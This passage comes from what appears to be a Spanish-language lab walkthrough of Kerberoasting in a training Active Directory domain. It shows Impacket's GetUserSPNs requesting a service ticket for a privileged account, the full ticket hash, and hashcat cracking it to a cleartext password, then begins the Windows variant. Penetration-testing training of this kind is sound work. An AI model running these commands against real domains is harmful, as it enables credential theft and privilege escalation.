MSSQL/ACADEMY-EA-FILE                              damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378             
backupjob/veam001.inlanefreight.local              backupagent        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  2022-04-18 21:20:32.090310             
sts/inlanefreight.local                            solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>                                
MSSQLSvc/SPSJDB.inlanefreight.local:1433           sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>                                
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351      sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>                                
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433      sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>                                
adfsconnect/azure01.inlanefreight.local            adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>                                
testspn/kerberoast.inlanefreight.local             testspn                                                                                                      2022-02-27 15:15:43.406442  <never>                                
testspn2/kerberoast.inlanefreight.local            testspn2                                                                                                     2022-02-27 15:59:39.843945  <never>                                
http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL         certsvc                                                                                                      2022-03-30 15:44:18.414039  2022-03-30 15:50:53.679679             
vmware/inlanefreight.local                         svc_vmwaresso                                                                                                2022-04-05 15:32:46.799565  <never>                                
SAPService/srv01.inlanefreight.local               SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL                                 2022-04-18 14:40:02.959792  <never>      
```

Efectivamente, encontramos la cuenta objetivo: `SAPService/srv01.inlanefreight.local` y vemos que es miembro de Account Operators, que a priori parece un grupo con privilegios en el dominio.

Ahora con la cuenta localizada, vamos a solicitar un Ticket TGS sencillo para esta cuenta:

{% code overflow="wrap" %}

```
┌─[htb-student@ea-attack01]─[/opt/impacket/examples]
└──╼ $python3 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                  Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
------------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never>               


$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$f4485b6bedaf8a0f8547aa426dc3bfc1$20d5854cb7092dff4bd3da294c3ab4c776025ab0530f67fd5d4fbe1dd9ca4c36ec506a0f0f6a245b86f94de18b170c459fa4090f42e3fe5969e24daecdfada663d6bd51cbdddbba35571b9f310df9d72f548b203e63af8910439b2f1034d292f190cbd08e47f13a85743371294cee2c5e142c673810bfef1dc827b70346638fef8f7255918a7024525f194bd4645d3ec666d5c1b8aa7be373b74baca74596eaacbfbfaa1886731266091255f942eb4dd9392b869e9b7d97878496a6fffe7990f4add2f671bc1239e562fda0088fac4ef8c8d8eb050bf2b4168b81b687b01f3ddd7fb1127ae586f082a45ebcd9bd6ee0104ae1f37f8979667ec3413ca9a2956806b32777573c3d8c469ba372cb00d837a6ecfd7eef87d6c25ee6c28cb385566ba884856e824a3f68487bbce771910d00bddfb89b3c0677a0a501d5d0e188864e4687795692c2199a34923802f246f6a31ac4ba65d6c57135a42327c22bb72433e5fa79facf31e8fcdb26dff892da656a9ffe7f91189d81751a9a7cb6ea492f179c8e96e395a821056c8f4c72ada3eb910dd82d81061671b58262534908dd9b7646a94c3b8c6a908dac321d2a3aa40c8d6a283586b92891b3d92e5315ac0909f06305567fe43f32c1a6b8047f52e089d87fb7f2eb305dbee9038db8170b137f89dd2a1e3addab8726cc3c03e47ce6e00a20c86bfb65ca4433c6bc5f4f7ac21976cb8d78e58a67bc088fc455211ad3fd9bfd0d5b3cddbece770b93fdf84af7937db9e0e43efbba9ed864d12040d055a4d81c37b7e3ea82dab5d3bd52812db6fe3964453725d75fe13fc089b378654b5890017445e1feb7849eb6f1da3653cf78fc0065fddd72931849606a2a2ee47fc654ef77e7650fb90bc378658970ba1a284a256092c1802438d514a5d165dcefe42ce6f1e95b4a3a632bf89e124153b52b35f811d84db0443ed90062ba87b31ebdc387e581dcf1b9e553f5cc73cdae4d8c853d309b64743a4d03a7aa20188f456626585502e60957bf10f383b893a7e144d361d8472902c86d9f5f2657d0fa1e8e224e67a59809a1c1c1f2d09f0d6242ee83910b438248a6b83758e968e09b4cb2d3af28112e68fd48055e6877150d76f20b2848de048cf202be099f0f9cc6bca5550383668a951006dcb2cee2266e702eaabe5da4be5176b349a3e3b81ec4c1d9b3745003b384cfcdf1240e4b2d59044ec0ac5a519bf651adf908a331e23d43c30a7ef500ebad797baf82a04a2fef39972335239b63fd49d6aa69f645e702e69377a9c7679b758c4bcb2a84dca4f4da3af733c1043b735ffbb007cdb9d917383ef02ebbc9c977ab0c523b818c1fbe9fda6af9687a95e2e896a10193b361ba44ed55fd42e7447efa4490b3090d97acc60e2782b4156c8889c22f2672aff53747f2dc6bae8
```

{% endcode %}

Buuum! Obtenemos el Ticket TGS de este usuario y vamos a crackearlo con hashcat para obtener la contraseña en plano:

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: cpu--0x000, 2137/4338 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1


$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$f4485b6bedaf8a0f8547aa426dc3bfc1$20d5854cb7092dff4bd3da294c3ab4c776025ab0530f67fd5d4fbe1dd9ca4c36ec506a0f0f6a245b86f94de18b170c459fa4090f42e3fe5969e24daecdfada663d6bd51cbdddbba35571b9f310df9d72f548b203e63af8910439b2f1034d292f190cbd08e47f13a85743371294cee2c5e142c673810bfef1dc827b70346638fef8f7255918a7024525f194bd4645d3ec666d5c1b8aa7be373b74baca74596eaacbfbfaa1886731266091255f942eb4dd9392b869e9b7d97878496a6fffe7990f4add2f671bc1239e562fda0088fac4ef8c8d8eb050bf2b4168b81b687b01f3ddd7fb1127ae586f082a45ebcd9bd6ee0104ae1f37f8979667ec3413ca9a2956806b32777573c3d8c469ba372cb00d837a6ecfd7eef87d6c25ee6c28cb385566ba884856e824a3f68487bbce771910d00bddfb89b3c0677a0a501d5d0e188864e4687795692c2199a34923802f246f6a31ac4ba65d6c57135a42327c22bb72433e5fa79facf31e8fcdb26dff892da656a9ffe7f91189d81751a9a7cb6ea492f179c8e96e395a821056c8f4c72ada3eb910dd82d81061671b58262534908dd9b7646a94c3b8c6a908dac321d2a3aa40c8d6a283586b92891b3d92e5315ac0909f06305567fe43f32c1a6b8047f52e089d87fb7f2eb305dbee9038db8170b137f89dd2a1e3addab8726cc3c03e47ce6e00a20c86bfb65ca4433c6bc5f4f7ac21976cb8d78e58a67bc088fc455211ad3fd9bfd0d5b3cddbece770b93fdf84af7937db9e0e43efbba9ed864d12040d055a4d81c37b7e3ea82dab5d3bd52812db6fe3964453725d75fe13fc089b378654b5890017445e1feb7849eb6f1da3653cf78fc0065fddd72931849606a2a2ee47fc654ef77e7650fb90bc378658970ba1a284a256092c1802438d514a5d165dcefe42ce6f1e95b4a3a632bf89e124153b52b35f811d84db0443ed90062ba87b31ebdc387e581dcf1b9e553f5cc73cdae4d8c853d309b64743a4d03a7aa20188f456626585502e60957bf10f383b893a7e144d361d8472902c86d9f5f2657d0fa1e8e224e67a59809a1c1c1f2d09f0d6242ee83910b438248a6b83758e968e09b4cb2d3af28112e68fd48055e6877150d76f20b2848de048cf202be099f0f9cc6bca5550383668a951006dcb2cee2266e702eaabe5da4be5176b349a3e3b81ec4c1d9b3745003b384cfcdf1240e4b2d59044ec0ac5a519bf651adf908a331e23d43c30a7ef500ebad797baf82a04a2fef39972335239b63fd49d6aa69f645e702e69377a9c7679b758c4bcb2a84dca4f4da3af733c1043b735ffbb007cdb9d917383ef02ebbc9c977ab0c523b818c1fbe9fda6af9687a95e2e896a10193b361ba44ed55fd42e7447efa4490b3090d97acc60e2782b4156c8889c22f2672aff53747f2dc6bae8:!SapperFi2
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEF...c6bae8
```

{% endcode %}

Encontramos la contraseña en plano para esta cuenta: `!SapperFi2`  🏆

***

## <mark style="color:purple;">Ahora vamos con Windows</mark>

Ahora que hemos cubierto el proceso de Kerberoasting desde un host de ataque Linux, repasaremos el proceso desde un host Windows. Podemos decidir realizar parte o la totalidad de nuestras pruebas desde un host Windows, nuestro cliente puede proporcionarnos un host Windows desde el que realizar pruebas o podemos comprometer un host y necesitar usarlo como punto de partida para futuros ataques. Independientemente de cómo usemos los hosts Windows durante nuestras evaluaciones, para mantener la versatilidad, es esencial comprender cómo realizar tantos ataques como sea posible desde hosts Linux y Windows, porque nunca sabemos qué nos arrojarán de una evaluación a otra.
